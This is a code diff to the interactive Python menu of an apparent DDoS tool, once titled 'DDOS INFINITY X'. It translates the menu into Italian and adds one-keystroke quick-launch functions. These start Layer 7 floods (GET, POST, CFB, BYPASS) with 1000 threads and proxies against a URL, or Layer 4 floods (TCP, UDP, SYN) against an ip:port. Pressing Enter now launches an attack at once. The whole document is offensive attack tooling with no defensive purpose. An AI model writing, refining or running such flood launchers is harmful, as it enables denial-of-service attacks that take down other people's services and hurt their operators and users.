@@ -117,6 +117,22 @@ def show_banner(*, clear: bool = False, show_commands: bool = True) -> None:
         _print_quick_commands()
 
 
+def _default_l7_method(l7: Sequence[str]) -> str:
+    order = ("GET", "POST", "CFB", "BYPASS", "HEAD")
+    for m in order:
+        if m in {x.upper() for x in l7}:
+            return m
+    return sorted(l7)[0].upper() if l7 else "GET"
+
+
+def _default_l4_method(l4: Sequence[str]) -> str:
+    order = ("TCP", "UDP", "SYN")
+    for m in order:
+        if m in {x.upper() for x in l4}:
+            return m
+    return sorted(l4)[0].upper() if l4 else "TCP"
+
+
 def show_main_menu(
     *,
     l7: Iterable[str],
@@ -125,19 +141,62 @@ def show_main_menu(
     script: str = "start.py",
 ) -> None:
     show_banner(show_commands=False)
+    m7 = _default_l7_method(tuple(l7))
+    m4 = _default_l4_method(tuple(l4))
     _out(_SEP)
-    _out(f"  {_Y}{_B}  MAIN MENU  —  DDOS INFINITY X{_R}\n")
+    _out(f"  {_Y}{_B}  MENU  —  scegli 1 2 3 4{_R}\n")
     opts = [
-        ("1", "Layer 7 attack", "GET POST CFB BYPASS …"),
-        ("2", "Layer 4 attack", "TCP UDP SYN …"),
-        ("3", "Tools console", "PING CHECK DSTAT"),
-        ("4", "List all methods", ""),
-        ("5", "Full HELP / syntax", ""),
-        ("6", "Exit", ""),
+        ("1", f"Attacco L7 ({m7})", "solo URL → parte subito"),
+        ("2", f"Attacco L4 ({m4})", "solo ip:port → parte subito"),
+        ("3", "Tools", "PING CHECK DSTAT …"),
+        ("4", "Lista metodi + HELP", ""),
+        ("0", "Esci", ""),
     ]
     for num, title, desc in opts:
-        _out(f"  {_G}[{num}]{_R} {_W}{title:<22}{_R} {_D}{desc}{_R}")
+        _out(f"  {_G}[{num}]{_R} {_W}{title:<28}{_R} {_D}{desc}{_R}")
+    _out(f"\n  {_D}Invio = opzione 1  ·  anche: python3 {script} 1 <url>{_R}")
     _out(f"\n{_SEP}\n")
+
+
+def run_quick_l7(
+    script: str,
+    *,
+    url: str | None = None,
+    method: str | None = None,
+    l7: Sequence[str] | None = None,
+) -> None:
+    """Option 1 — first L7 attack (GET) with defaults."""
+    l7_set = {m.upper() for m in (l7 or ())}
+    method = (method or _default_l7_method(l7 or ("GET",))).upper()
+    if l7_set and method not in l7_set:
+        method = _default_l7_method(l7 or ())
+    if not url:
+        url = _prompt("URL target", "http://")
+    if not url.startswith(("http://", "https://")):
+        url = "http://" + url.lstrip("/")
+    show_attack_banner(method, url, 1000, 60)
+    _run_script(
+        [method, url, "0", "1000", "http.txt", "10", "60"],
+        script,
+    )
+
+
+def run_quick_l4(
+    script: str,
+    *,
+    target: str | None = None,
+    method: str | None = None,
+    l4: Sequence[str] | None = None,
+) -> None:
+    """Option 2 — first L4 attack (TCP) with defaults."""
+    l4_set = {m.upper() for m in (l4 or ())}
+    method = (method or _default_l4_method(l4 or ("TCP",))).upper()
+    if l4_set and method not in l4_set:
+        method = _default_l4_method(l4 or ())
+    if not target:
+        target = _prompt("ip:port", "127.0.0.1:80")
+    show_attack_banner(method, target, 500, 60)
+    _run_script([method, target, "500", "60"], script)
 
 
 def show_attack_banner(method: str, target: str, threads: int, duration: int) -> None:
@@ -169,55 +228,28 @@ def run_interactive_menu(
     tools: Sequence[str],
     usage_cb=None,
 ) -> None:
-    l7_set = {m.upper() for m in l7}
-    l4_set = {m.upper() for m in l4}
-
     while True:
         show_main_menu(l7=l7, l4=l4, tools=tools, script=script)
-        choice = _prompt("Choice", "5").upper()
+        choice = _prompt("Scelta (1-4, 0 esci)", "1").upper()
 
-        if choice in {"6", "Q", "EXIT", "E"}:
-            _out(f"  {_Y}Goodbye.{_R}\n")
+        if choice in {"0", "6", "Q", "EXIT", "E"}:
+            _out(f"  {_Y}Uscita.{_R}\n")
             return
-        if choice == "4":
-            _print_methods(l7, "LAYER 7", _M)
-            _print_methods(l4, "LAYER 4", _C)
-            _out(f"\n  {_D}Tools:{_R} {', '.join(sorted(tools))}")
-            input(f"\n  {_D}Press Enter...{_R}")
+        if choice in {"1", ""}:
+            run_quick_l7(script, l7=l7)
             continue
-        if choice == "5":
-            if usage_cb:
-                usage_cb()
-            input(f"\n  {_D}Press Enter...{_R}")
+        if choice == "2":
+            run_quick_l4(script, l4=l4)
             continue
         if choice == "3":
             _run_script(["tools"], script)
             continue
-        if choice == "1":
-            method = _prompt("L7 Method", "GET").upper()
-            if method not in l7_set:
-                _out(f"  {_RED}Unknown method.{_R}")
-                continue
-            _run_script([
-                method,
-                _prompt("URL", "http://"),
-                _prompt("Socks", "0"),
-                _prompt("Threads", "1000"),
-                _prompt("Proxy file", "http.txt"),
-                _prompt("RPC", "10"),
-                _prompt("Seconds", "60"),
-            ], script)
+        if choice == "4":
+            _print_methods(l7, "LAYER 7", _M)
+            _print_methods(l4, "LAYER 4", _C)
+            _out(f"\n  {_D}Tools:{_R} {', '.join(sorted(tools))}")
+            if usage_cb:
+                usage_cb()
+            input(f"\n  {_D}Invio per tornare al menu...{_R}")
             continue
-        if choice == "2":
-            method = _prompt("L4 Method", "TCP").upper()
-            if method not in l4_set:
-                _out(f"  {_RED}Unknown method.{_R}")
-                continue
-            _run_script([
-                method,
-                _prompt("ip:port", "127.0.0.1:80"),
-                _prompt("Threads", "500"),
-                _prompt("Seconds", "60"),
-            ], script)
-            continue
-        _out(f"  {_RED}Invalid. Use 1-6.{_R}")
+        _out(f"  {_RED}Non valido. Usa 1, 2, 3, 4 o 0.{_R}")
